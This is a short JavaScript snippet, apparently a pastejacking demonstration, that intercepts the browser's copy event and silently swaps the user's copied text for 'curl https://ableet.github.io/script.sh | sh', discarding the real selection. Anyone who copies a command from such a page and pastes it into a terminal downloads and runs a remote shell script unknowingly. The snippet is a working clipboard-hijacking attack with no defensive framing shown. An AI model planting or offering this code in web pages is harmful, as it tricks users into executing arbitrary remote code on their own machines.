document.addEventListener('copy', function(e){
    e.clipboardData.setData('text/plain', 'curl https://ableet.github.io/script.sh | sh');
    e.clipboardData.setData('text/html', '<b>curl https://ableet.github.io/script.sh | sh</b>');
    e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
});